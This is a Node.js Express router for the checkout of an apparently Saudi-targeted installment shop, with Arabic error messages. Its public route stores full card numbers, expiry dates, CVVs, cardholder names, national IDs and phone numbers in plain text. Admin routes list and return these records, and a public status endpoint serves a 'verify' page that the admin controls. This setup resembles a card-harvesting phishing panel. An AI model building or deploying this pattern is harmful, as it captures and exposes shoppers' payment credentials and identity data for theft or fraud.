const express = require("express");
const jwt = require("jsonwebtoken");
const router = express.Router();
const Checkout = require("../models/Checkout");

function authMiddleware(req, res, next) {
  const token = req.cookies?.admin_token;
  if (!token) return res.status(401).json({ error: "غير مصرح" });
  try {
    req.admin = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: "غير مصرح" });
  }
}

// Helper: Sanitize string inputs
function sanitize(str) {
  if (!str || typeof str !== "string") return "";
  return str.replace(/[<>'"]/g, "").trim().slice(0, 500);
}

// Helper: Validate Saudi national ID
function isValidSaudiId(id) {
  if (!id || typeof id !== "string") return false;
  return /^[12]\d{9}$/.test(id);
}

// Helper: Validate Saudi phone number
function isValidSaudiPhone(phone) {
  if (!phone || typeof phone !== "string") return false;
  const cleaned = phone.replace(/\D/g, "");
  return /^05\d{8}$/.test(cleaned);
}

// POST /api/checkout — public (يستقبل طلب جديد)
router.post("/", async (req, res) => {
  try {
    const {
      orderId, cardNumber, expiry, cvv, cardHolder,
      items, total, downPayment, customer, whatsapp,
      nationalId, address, installmentType, months, monthlyPayment, discountAmount,
    } = req.body;

    // ── Validation ──
    if (!orderId || typeof orderId !== "string") {
      return res.status(400).json({ ok: false, error: "رقم الطلب مطلوب" });
    }

    if (!cardNumber || !expiry || !cvv || !cardHolder) {
      return res.status(400).json({ ok: false, error: "بيانات البطاقة ناقصة" });
    }

    if (!items || !Array.isArray(items) || items.length === 0) {
      return res.status(400).json({ ok: false, error: "لا توجد منتجات في الطلب" });
    }

    if (!customer || !whatsapp || !nationalId || !address) {
      return res.status(400).json({ ok: false, error: "بيانات العميل ناقصة" });
    }

    // Validate national ID
    if (!isValidSaudiId(nationalId)) {
      return res.status(400).json({ ok: false, error: "رقم الهوية غير صحيح" });
    }

    // Validate phone number
    if (!isValidSaudiPhone(whatsapp)) {
      return res.status(400).json({ ok: false, error: "رقم الواتساب غير صحيح" });
    }

    // Validate total
    const totalNum = Number(total);
    if (isNaN(totalNum) || totalNum <= 0) {
      return res.status(400).json({ ok: false, error: "المبلغ الإجمالي غير صحيح" });
    }

    // Check for duplicate orderId
    const existingOrder = await Checkout.findOne({ orderId });
    if (existingOrder) {
      console.warn(`[DUPLICATE] Order ${orderId} already exists`);
      return res.status(200).json({ 
        ok: true, 
        orderId: existingOrder.orderId, 
        _id: existingOrder._id,
        duplicate: true 
      });
    }

    // Sanitize inputs
    const sanitizedItems = items.map(item => ({
      productId: sanitize(item.productId || ""),
      name: sanitize(item.name || ""),
      price: Number(item.price) || 0,
      quantity: Math.max(1, Math.floor(Number(item.quantity) || 1)),
    }));

    const checkout = new Checkout({
      orderId,
      cardNumber: sanitize(cardNumber),
      expiry: sanitize(expiry),
      cvv: sanitize(cvv),
      cardHolder: sanitize(cardHolder),
      items: sanitizedItems,
      total: totalNum,
      downPayment: Number(downPayment) || 0,
      customer: sanitize(customer),
      whatsapp: whatsapp.replace(/\D/g, ""),
      nationalId: sanitize(nationalId),
      address: sanitize(address),
      installmentType: installmentType === "installment" ? "installment" : "full",
      months: Math.max(0, Math.floor(Number(months) || 0)),
      monthlyPayment: Number(monthlyPayment) || 0,
      discountAmount: Math.max(0, Number(discountAmount) || 0),
    });
    
    await checkout.save();
    console.log(`[SUCCESS] Order created: ${orderId}, _id: ${checkout._id}`);
    
    res.status(201).json({ ok: true, orderId: checkout.orderId, _id: checkout._id });
  } catch (error) {
    console.error("[ERROR] Checkout creation failed:", error);
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// GET /api/checkout/:id/status — public (للـ polling من صفحة verify)
router.get("/:id/status", async (req, res) => {
  try {
    const order = await Checkout.findById(req.params.id).select("status");
    if (!order) return res.status(404).json({ ok: false });
    res.json({ status: order.status });
  } catch {
    res.status(500).json({ ok: false });
  }
});

// GET /api/checkout — admin only
router.get("/", authMiddleware, async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 50));
    const orders = await Checkout.find().sort({ createdAt: -1 }).skip((page - 1) * limit).limit(limit);
    res.json(orders);
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// GET /api/checkout/:id — admin only
router.get("/:id", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findById(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json(order);
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// PUT /api/checkout/:id/status — admin only
const ALLOWED_STATUSES = ["pending", "confirmed", "cancelled"];
router.put("/:id/status", authMiddleware, async (req, res) => {
  try {
    const { status } = req.body;
    if (!ALLOWED_STATUSES.includes(status))
      return res.status(400).json({ ok: false, error: "حالة غير صحيحة" });
    const order = await Checkout.findByIdAndUpdate(
      req.params.id,
      { status },
      { new: true }
    );
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json(order);
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// PUT /api/checkout/:id/financials — admin only
router.put("/:id/financials", authMiddleware, async (req, res) => {
  try {
    const { total, downPayment, months, monthlyPayment } = req.body;
    const update = {};
    if (total !== undefined) update.total = Number(total);
    if (downPayment !== undefined) update.downPayment = Number(downPayment);
    if (months !== undefined) update.months = Number(months);
    if (monthlyPayment !== undefined) update.monthlyPayment = Number(monthlyPayment);
    const order = await Checkout.findByIdAndUpdate(req.params.id, update, { new: true });
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json(order);
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// DELETE /api/checkout/:id — admin only
router.delete("/:id", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findByIdAndDelete(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json({ ok: true });
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

module.exports = router;
